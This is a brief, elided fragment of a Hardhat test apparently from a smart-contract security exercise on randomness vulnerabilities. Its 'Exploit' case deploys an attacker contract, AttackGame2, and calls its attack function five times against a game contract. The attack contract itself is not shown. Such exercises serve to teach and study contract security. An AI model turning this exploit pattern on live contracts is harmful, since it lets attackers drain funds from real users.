...
describe('Randomness Vulnerabilities Exercise 2', function () {
	...
	it('Exploit', async function () {
		...
		const attackerFactory = await ethers.getContractFactory('AttackGame2', attacker);
		const attackGame = await attackerFactory.deploy(game.address);
		for (let index = 0; index < 5; index++) {
			(await attackGame.connect(attacker).attack({ value: GAME_FEE })).wait();
		}
	});
